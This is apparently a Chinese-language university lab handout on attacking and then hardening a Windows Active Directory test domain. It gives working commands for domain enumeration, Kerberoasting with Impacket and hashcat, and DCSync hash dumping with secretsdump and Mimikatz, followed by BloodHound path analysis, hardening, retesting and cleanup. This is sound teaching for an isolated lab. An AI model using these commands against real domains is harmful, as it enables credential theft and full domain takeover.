---
title: "实验六：Windows域环境渗透与提权"
---

# 实验六：Windows域环境渗透与提权

> 对应章节：项目六 Windows 域管理  
> 实验目标：掌握域信息收集、Kerberoasting、DCSync、BloodHound 路径分析与基础加固验证的完整流程  
> 预计用时：150 分钟  
> 难度等级：⭐⭐⭐⭐（高级）  
> 适用范围：仅限隔离、授权的教学靶场，禁止用于真实生产域环境

## 一、实验概览

### 1.1 实验主线

本实验围绕一条比较典型的域攻击链展开。阅读和操作时，不要把它看成一堆分散的命令，而要把它理解成“攻击者怎样一步一步把权限做大”的完整过程：

1. 使用普通域用户完成域信息收集。
2. 枚举可 Kerberoasting 的服务账户并离线破解弱密码。
3. 利用被错误授权的高权限服务账户执行 DCSync。
4. 提取 `krbtgt` 哈希，理解黄金票据的伪造条件与危害。
5. 使用 BloodHound 分析攻击路径，并完成基础加固与复测。

### 1.2 实验成功标准

完成本实验后，应尽量达到下面几个目标：

- 能自己判断一台主机是不是域控，并说清楚关键端口分别在做什么。
- 能用普通域用户完成一次标准的域信息收集，并导出可用于 Kerberoasting 的 TGS 哈希。
- 能解释为什么服务账户一旦弱口令、永不过期、权限又大，就会成为域环境里的高危点。
- 能说明 DCSync 到底在“同步”什么，为什么拿到 `krbtgt` 哈希后风险会一下子升级。
- 能从防守者角度提出至少 3 条有效加固措施，并用复测结果证明加固确实生效。

### 1.3 实验边界

> 本实验涉及 Kerberoasting、DCSync、黄金票据等高风险技术。所有命令、账户和密码都只能在实验靶场里使用。实验结束后应恢复快照、重置密码或删除测试对象，避免把高风险配置留在环境里。

---

## 二、前置知识点

### 2.1 Active Directory 核心逻辑结构

开始操作前，先不要急着直接跑命令。域渗透和单机提权最大的不同，在于它不是盯着一台机器，而是在看“整张身份和权限关系网”。因此需要先把 AD 的逻辑结构理清楚。

```text
森林（Forest）
└── 域树（Tree）
    └── 域（Domain）
        ├── 组织单元（OU）
        │   ├── 用户（User）
        │   ├── 计算机（Computer）
        │   └── 组（Group）
        └── 信任关系（Trust）
```

| 组件 | 作用 | 示例 |
| --- | --- | --- |
| Forest | AD 的最高逻辑边界 | `corp.local` 所属森林 |
| Tree | 共享连续 DNS 命名空间的一组域 | `corp.local`、`sub.corp.local` |
| Domain | 认证、授权与管理的基本边界 | `corp.local` |
| OU | 用于组织对象与下发 GPO | `OU=IT,DC=corp,DC=local` |
| Group | 方便授权和委派 | `Domain Admins` |
| Trust | 跨域/跨林访问的信任基础 | 双向可传递信任 |

### 2.2 域控制器上的关键资产

这里需要强调：域控最重要的不只是“它是一台服务器”，而是“它是整套身份体系的中心”。谁控制了域控，谁就几乎控制了整个域。

| 资产/服务 | 作用 | 失陷风险 |
| --- | --- | --- |
| `NTDS.dit` | 存储域对象与密码相关数据 | 可导出全域账号哈希 |
| DNS | 域名解析 | 域成员无法正常定位 DC |
| Kerberos KDC | 颁发 TGT 和服务票据 | 可被滥用于票据攻击 |
| LDAP/LDAPS | 目录查询 | 可被用于枚举用户、组、SPN |
| SYSVOL/NETLOGON | 存储登录脚本与策略文件 | 可泄露脚本、口令和策略 |
| `krbtgt` | Kerberos 票据签名账户 | 泄露后可伪造黄金票据 |

### 2.3 Kerberos 认证流程

下面这个流程图大家一定要看懂。后面 Kerberoasting、白银票据、黄金票据，本质上都是在利用 Kerberos 正常工作流程里的某一环。

```text
用户登录            域控制器（KDC）                    目标服务
┌─────┐           ┌──────────────┐                 ┌──────────────┐
│ 用户 │ --AS-REQ-->  AS（认证服务）                  │              │
│     │ <--TGT-----  返回 TGT                        │              │
│     │                                             │              │
│     │ --TGS-REQ(TGT)---------------------------->  TGS（票据授予）│
│     │ <----Service Ticket-----------------------  返回服务票据    │
│     │                                             │              │
│     │ --AP-REQ(Service Ticket)---------------------------------->│
│     │ <----------------------------- 服务响应 -------------------│
└─────┘           └──────────────┘                 └──────────────┘
```

| 票据 | 含义 | 常见攻击面 |
| --- | --- | --- |
| TGT | 证明用户已通过初始认证 | 黄金票据 |
| Service Ticket | 证明用户可访问指定服务 | Kerberoasting、白银票据 |

### 2.4 Kerberos 常见攻击面

| 攻击方式 | 基本原理 | 典型前提 |
| --- | --- | --- |
| Kerberoasting | 请求服务票据并离线破解服务账户密码 | 普通域用户、目标账户存在 SPN |
| AS-REP Roasting | 枚举禁用预认证的账户并离线破解 | 账户未启用预认证 |
| 白银票据 | 获取服务账户哈希后伪造特定服务票据 | 已获服务账户密钥 |
| 黄金票据 | 获取 `krbtgt` 哈希后伪造任意 TGT | 已获域级复制或域管权限 |

### 2.5 DCSync 与黄金票据的关系

这一段是本实验的核心逻辑。不要把 DCSync 和黄金票据当成两个孤立的知识点，而要把它们连成一条完整的提权链。

```text
错误授权/高权限账户
        │
        ▼
获得目录复制权限（DCSync）
        │
        ▼
导出 Administrator / krbtgt 哈希
        │
        ▼
伪造黄金票据（Golden Ticket）
        │
        ▼
持久化域管访问能力
```

执行 DCSync 常见需要以下权限之一：

- `Replicating Directory Changes`
- `Replicating Directory Changes All`
- `Domain Admins`
- `Enterprise Admins`
- `Administrators`

> 理解重点：Kerberoasting 本身并不等于“直接拿下域管”。它更像是一个入口。真正决定能否从普通域用户一路走到全域控制的，是这个服务账户背后是否存在高权限、错误委派，或者可继续横向利用的能力。

---

## 三、实验环境配置

### 3.1 网络拓扑

```text
┌─────────────────────┐                    ┌─────────────────────┐
│     Kali Linux      │      NAT 网络      │   Windows Server    │
│   2025.4（攻击机）  │ <---------------> │   2025（域控 DC01） │
│  192.168.1.10       │   192.168.1.0/24   │   192.168.1.20      │
└─────────────────────┘                    │   corp.local        │
                                           └─────────────────────┘
```

### 3.2 角色与账户约定

| 对象 | 角色 | 用途 |
| --- | --- | --- |
| `DC01.corp.local` | 域控制器 | DNS、KDC、LDAP、AD DS |
| `CORP\\Administrator` | 域管理员 | 初始化、加固与验证 |
| `CORP\\zhangsan` | 普通域用户 | 域信息收集、Kerberoasting |
| `CORP\\sqlsvc` | 服务账户 | 演示弱口令服务账户风险 |
| `CORP\\itadmin` | 高权限账号 | Protected Users 加固验证 |

### 3.3 域控基础配置

#### 3.3.1 安装 AD DS 并创建林

这里建议边做边记。域环境中的很多故障，最后都能追溯到最开始的主机名、DNS 或林初始化参数没有配对。

在 Windows Server 上使用管理员 PowerShell 执行：

```powershell
Rename-Computer -NewName "DC01" -Restart
```

重启后继续执行：

```powershell
Install-WindowsFeature AD-Domain-Services, DNS -IncludeManagementTools

$SafeModePwd = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

Install-ADDSForest `
  -DomainName "corp.local" `
  -DomainNetbiosName "CORP" `
  -InstallDNS `
  -SafeModeAdministratorPassword $SafeModePwd `
  -Force
```

#### 3.3.2 创建实验对象

下面这段脚本的目的，不是让大家背命令，而是让大家明确域里哪些对象是“普通用户”、哪些是“服务账户”、哪些对象将来会成为攻击链的关键节点。口令均为靶场示例，实验后应重置或删除。

```powershell
Import-Module ActiveDirectory

New-ADOrganizationalUnit -Name "Servers" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Employees" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=corp,DC=local"

$UserPwd = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
$SvcPwd  = ConvertTo-SecureString "Service@2024" -AsPlainText -Force
$AdmPwd  = ConvertTo-SecureString "Admin@2024!" -AsPlainText -Force

New-ADUser -Name "zhangsan" -SamAccountName "zhangsan" `
  -UserPrincipalName "zhangsan@corp.local" `
  -AccountPassword $UserPwd -Enabled $true `
  -Path "OU=Employees,DC=corp,DC=local"

New-ADUser -Name "itadmin" -SamAccountName "itadmin" `
  -UserPrincipalName "itadmin@corp.local" `
  -AccountPassword $AdmPwd -Enabled $true `
  -Path "OU=Employees,DC=corp,DC=local"

New-ADUser -Name "sqlsvc" -SamAccountName "sqlsvc" `
  -UserPrincipalName "sqlsvc@corp.local" `
  -AccountPassword $SvcPwd -Enabled $true `
  -PasswordNeverExpires $true `
  -Path "OU=ServiceAccounts,DC=corp,DC=local"

Set-ADUser -Identity "sqlsvc" -ServicePrincipalNames @{
  Add = "MSSQLSvc/dc01.corp.local:1433"
}
```

#### 3.3.3 可选：为教学演示准备“错误授权”场景

如果需要把实验链条演示得更完整，可以在**隔离靶场**中额外准备一个被错误授权的高权限服务账户。例如：

- 给 `sqlsvc` 赋予本地管理员权限；
- 或错误委派目录复制权限；
- 或让 `sqlsvc` 持有可被远程利用的高权限服务。

> 建议：不要把“普通用户天生就有 DCSync 权限”设成默认前提，因为这既不真实，也容易误解提权路径。更合理的设计是：先让普通用户拿到服务账户，再观察这个服务账户为什么能继续往上走。

### 3.4 攻击机准备

```bash
sudo tee /etc/resolv.conf >/dev/null <<'EOF'
nameserver 192.168.1.20
search corp.local
EOF

sudo apt update
sudo apt install -y crackmapexec ldap-utils hashcat bloodhound-python
```

如需验证 Kerberos 解析，也可补充：

```bash
host dc01.corp.local 192.168.1.20
nslookup corp.local 192.168.1.20
```

---

## 四、实验步骤

### 阶段一：域信息收集

这一阶段要养成一个习惯：先把环境摸清楚，再谈攻击。不做画像，后面的每一步都会像在黑屋子里乱撞。

### 阶段目标

- 明确目标主机是不是域控。
- 把这个域里最基本的“人、组、机器、策略”摸清楚。
- 给后面的 Kerberoasting 和 BloodHound 分析准备可靠输入。

### 步骤 1：识别域控关键端口

```bash
nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 192.168.1.20
```

预期关注端口：

- `53/tcp`：DNS
- `88/tcp`：Kerberos
- `389/tcp`：LDAP
- `445/tcp`：SMB
- `636/tcp`：LDAPS
- `3268/tcp`：Global Catalog

这里可以顺手追问或自问：为什么一看到 `88`、`389`、`445`、`3268` 这几个端口同时出现，就会高度怀疑目标是域控，而不是一台普通成员服务器？

### 步骤 2：LDAP 枚举基础信息

```bash
ldapsearch -x -H ldap://192.168.1.20 \
  -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

如果允许匿名绑定，可继续收集更多对象信息；若匿名绑定被禁用，则使用普通域用户继续：

```bash
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --users
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --groups
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --computers
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --domain-info
crackmapexec ldap 192.168.1.20 -d corp.local -u zhangsan -p 'P@ssw0rd123' --password-policy
```

这里不要只盯着“命令有没有回显”，更要看回显里透露出的组织结构。一个好的攻击者，看到的不只是用户列表，而是哪些用户像普通员工、哪些像运维、哪些像服务账户。

### 步骤 3：枚举可被 Kerberoasting 的账户

```bash
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  corp.local/zhangsan:'P@ssw0rd123' \
  -dc-ip 192.168.1.20
```

重点观察：

- 是否存在绑定 SPN 的服务账户；
- 服务账户是否启用了弱密码、永不过期；
- 服务账户是否持有高权限或被错误委派。

> 记录建议：把域名、域控主机名、域用户、域组、密码策略、SPN 账户列表整理成表格，作为实验报告的“攻击前资产画像”。

---

### 阶段二：Kerberoasting 攻击

这一阶段开始进入真正的攻击利用。Kerberoasting 之所以经典，不是因为它花哨，而是因为它往往只需要一个普通域用户就能启动。

### 阶段目标

- 请求服务票据并导出 TGS 哈希。
- 完成一次离线破解，理解为什么服务账户特别危险。
- 观察“弱口令 + 永不过期 + 高权限”是怎样组合成风险的。

### 步骤 4：请求服务票据

```bash
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  corp.local/zhangsan:'P@ssw0rd123' \
  -dc-ip 192.168.1.20 \
  -request \
  -outputfile /tmp/tgs_hashes.txt
```

### 步骤 5：离线破解 TGS 哈希

```bash
hashcat -m 13100 /tmp/tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

或：

```bash
john --format=krb5tgs /tmp/tgs_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt
```

示例输出：

```text
MSSQLSvc/dc01.corp.local:1433::CORP:sqlsvc:...:Service@2024
```

如果这里真的能爆出明文密码，需要立刻追问两个问题：第一，这个账户是谁在用；第二，这个账户到底能干什么。真正危险的从来不是“爆出一个密码”本身，而是“这个密码背后的身份边界”。

### 步骤 6：验证服务账户风险

```bash
/usr/share/doc/python3-impacket/examples/smbexec.py \
  corp.local/sqlsvc:'Service@2024'@192.168.1.20
```

如果当前靶场将 `sqlsvc` 设计为高权限或错误授权账户，可继续验证其权限边界：

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py \
  corp.local/sqlsvc:'Service@2024'@192.168.1.20 \
  -dc-ip 192.168.1.20
```

> 说明：并不是所有被 Kerberoasting 破解出来的服务账户都能直接 DCSync。真正危险的是“弱口令 + 高权限/错误授权”这两个条件叠加。

---

### 阶段三：DCSync 导出域哈希

到了这一阶段，关注点要从“能拿一个服务账户”过渡到“能不能控制整个域”。重点应放在权限来源，而不是只记工具名。

### 阶段目标

- 理解 DCSync 到底模拟了哪种合法行为。
- 明确哪些权限才足以触发 DCSync。
- 理解为什么一旦拿到 `krbtgt` 哈希，风险等级会从“高”直接跳到“极高”。

### 步骤 7：确认复制权限前提

满足以下任一条件时，账户可能可执行 DCSync：

- 属于 `Domain Admins`
- 属于 `Enterprise Admins`
- 属于 `Administrators`
- 被委派 `Replicating Directory Changes`
- 被委派 `Replicating Directory Changes All`

实验前应明确当前靶场中是哪一种前提成立。

这一步需要真正理解透彻。最容易出现的误解，就是把 DCSync 理解成“某个工具自带的神奇功能”。其实不是，工具只是把“目录复制”这个合法机制拿来滥用了。

### 步骤 8：在 Windows 靶机上使用 Mimikatz 执行 DCSync

在已获得高权限会话的 Windows 主机中执行：

```powershell
cd C:\Tools
.\mimikatz.exe
```

进入 Mimikatz 后：

```text
privilege::debug
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

重点关注输出中的：

- `Administrator` 的 NTLM 哈希；
- `krbtgt` 的 NTLM 哈希；
- 域 SID；
- 账号 RID。

这里可以停下来思考：为什么黄金票据不只是需要 `krbtgt` 哈希，还经常要配合域 SID 一起使用。

### 步骤 9：使用 Impacket 远程执行 DCSync

若当前已获得具备复制权限的账号，可在 Kali 上执行：

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py \
  corp.local/sqlsvc:'Service@2024'@192.168.1.20 \
  -dc-ip 192.168.1.20 \
  -just-dc
```

如需留存报告，可重定向输出：

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py \
  corp.local/sqlsvc:'Service@2024'@192.168.1.20 \
  -dc-ip 192.168.1.20 \
  -just-dc > /tmp/domain_hashes.txt
```

> 报告要求：输出内容必须脱敏，不得原样粘贴完整哈希。建议仅保留前 8 位与后 4 位做教学说明。

---

### 阶段四：BloodHound 攻击路径分析

前面已经用命令行做了点状枚举，这一阶段要把点连成线。BloodHound 的价值，不在于“图看起来很酷”，而在于它能把原本零散的权限关系变成一条可解释的攻击路径。

### 阶段目标

- 从零散枚举切换到路径化分析。
- 看清普通用户、服务账户、高权限组之间是怎么连起来的。
- 找出最短提权路径和最值得修的错误授权点。

### 步骤 10：收集 BloodHound 数据

```bash
bloodhound-python \
  -d corp.local \
  -u zhangsan \
  -p 'P@ssw0rd123' \
  -ns 192.168.1.20 \
  -c All \
  --zip
```

### 步骤 11：导入并分析

在 BloodHound 中优先执行以下查询：

1. `Find Shortest Paths to Domain Admins`
2. `Find All Domain Admins`
3. `Find Principals with DCSync Rights`
4. `Find Kerberoastable Users`
5. `Shortest Paths from Kerberoastable Users`

分析时重点回答：

- 普通域用户距离域管还差几步？
- 是哪个服务账户、组委派或 ACL 配置构成了突破口？
- 若移除该错误授权，攻击路径会如何变化？

如果理解还停留在“图上有一条线”，那说明分析还不够深入。更理想的表达方式是把这条线翻译成一句完整的话，例如：“普通域用户因为拿到了 `sqlsvc`，而 `sqlsvc` 又被错误授予复制权限，所以最终可以 DCSync 到域级哈希。”

---

### 阶段五：域安全加固与验证

这一阶段非常重要。前面做攻击，是为了看清问题；后面做加固，才是这门课真正要落到实处的地方。

### 阶段目标

- 切断前面已经验证过的关键攻击链。
- 用复测证明“配置改了以后，攻击确实不灵了”。
- 形成“问题在哪里、为什么危险、怎么修、修完怎么验证”的闭环。

### 步骤 12：实施基础加固

在域控上执行以下操作：

#### 12.1 将高权限账户加入 Protected Users

```powershell
Add-ADGroupMember -Identity "Protected Users" -Members "Administrator","itadmin"
```

Protected Users 的主要效果：

- 禁止使用 NTLM 进行身份验证；
- 禁止使用 DES/RC4 等弱 Kerberos 加密；
- 不缓存可重用凭据；
- 限制某些委派场景。

这里需要注意：Protected Users 不是“万能安全开关”。它适合保护高价值账号，但如果环境里还依赖某些旧协议或旧系统，直接启用可能会带来兼容性问题，因此在生产环境中必须先评估、再逐步推广。

#### 12.2 修复服务账户风险

```powershell
$NewSvcPwd = ConvertTo-SecureString "Str0ng-Service-2026!" -AsPlainText -Force
Set-ADAccountPassword -Identity "sqlsvc" -NewPassword $NewSvcPwd -Reset
Set-ADUser -Identity "sqlsvc" -PasswordNeverExpires $false
```

如课程环境支持，建议进一步改造为：

- 组托管服务账户（gMSA）
- 最小权限服务账户
- 专用主机、专用服务、专用口令策略

#### 12.3 修改 `krbtgt` 密码两次

```powershell
$NewKrbtgtPwd1 = ConvertTo-SecureString "Krbtgt-Reset-2026-01!" -AsPlainText -Force
Set-ADAccountPassword -Identity "krbtgt" -NewPassword $NewKrbtgtPwd1 -Reset

# 等待域复制完成后，再执行第二次重置
$NewKrbtgtPwd2 = ConvertTo-SecureString "Krbtgt-Reset-2026-02!" -AsPlainText -Force
Set-ADAccountPassword -Identity "krbtgt" -NewPassword $NewKrbtgtPwd2 -Reset
```

> 必须重置两次，才能让基于旧密钥签发的黄金票据完全失效。

#### 12.4 收紧复制权限与审计策略

- 移除非必要账户的目录复制权限；
- 审核高权限组成员变更；
- 启用目录服务访问、账户管理、Kerberos 服务票据相关日志；
- 对服务账户启用最小权限和定期轮换。

### 步骤 13：验证加固效果

#### 13.1 验证 Protected Users

```bash
crackmapexec smb 192.168.1.20 -d corp.local -u itadmin -p 'Admin@2024!'
```

预期现象：不再允许以普通 NTLM 方式完成原有认证流程。

#### 13.2 验证 Kerberoasting 收益下降

```bash
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
  corp.local/zhangsan:'P@ssw0rd123' \
  -dc-ip 192.168.1.20 \
  -request \
  -outputfile /tmp/tgs_new.txt

hashcat -m 13100 /tmp/tgs_new.txt /usr/share/wordlists/rockyou.txt --force
```

预期现象：仍可请求服务票据，但由于密码足够强，离线破解在实验时间内应难以成功。

#### 13.3 验证 DCSync 被阻断

```bash
/usr/share/doc/python3-impacket/examples/secretsdump.py \
  corp.local/sqlsvc:'Str0ng-Service-2026!'@192.168.1.20 \
  -dc-ip 192.168.1.20 \
  -just-dc
```

预期现象：如果复制权限已被正确移除，命令应失败或返回权限不足。

到这里应形成一个很重要的安全意识：真正有效的加固，不是“看起来配过了”，而是攻击链真的走不通了。

---

## 五、实验报告要求

### 5.1 报告必交内容

写报告时，不要只堆截图。每一部分最好都回答三个问题：做了什么、看到了什么、这说明了什么。

| 序号 | 记录项 | 建议内容 |
| --- | --- | --- |
| 1 | 实验环境 | 网络拓扑、主机 IP、域名、账户说明 |
| 2 | 域信息收集结果 | 用户、组、计算机、密码策略、SPN 列表 |
| 3 | Kerberoasting 过程 | TGS 哈希获取、离线破解结果、风险分析 |
| 4 | DCSync 结果 | 关键账户哈希的脱敏截图与文字说明 |
| 5 | BloodHound 分析 | 最短路径截图、关键错误授权点 |
| 6 | 加固与复测 | 改动项、命令、复测结果、结论 |

### 5.2 思考题

1. Kerberoasting 为什么通常只需要普通域用户权限？
2. 为什么“弱口令服务账户 + 高权限/错误授权”会构成高风险组合？
3. DCSync 与直接登录域控导出哈希相比，有什么隐蔽性和危害差异？
4. `krbtgt` 密码为什么必须修改两次？
5. 如果你是域管理员，最优先修复的 3 个问题会是什么？为什么？

这几道题不是为了背答案，而是为了训练把“攻击现象”翻译成“安全原理”和“治理思路”。

---

## 六、实验清理

### 6.1 删除测试对象

```powershell
Remove-ADUser -Identity "zhangsan" -Confirm:$false
Remove-ADUser -Identity "itadmin" -Confirm:$false
Remove-ADUser -Identity "sqlsvc" -Confirm:$false
```

### 6.2 恢复策略与快照

- 如果本实验修改了 `krbtgt`、Protected Users、ACL 或 GPO，请恢复到实验前快照；
- 若需保留域环境，应重新生成一套新的实验账户与随机密码；
- 清理导出的哈希、票据、截图与临时文件。

最后再强调一次：实验做完，环境一定要清。域实验最大的风险，不是在实验过程中跑了什么命令，而是在结束后把高风险对象、票据和弱口令留在环境里。

### 6.3 恢复主机保护配置

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

> **免责声明**：本讲义仅用于授权的安全教学与实验环境。对任何未授权的 Active Directory 域环境实施枚举、票据攻击、复制攻击或权限提升，均可能构成严重违法违规行为。
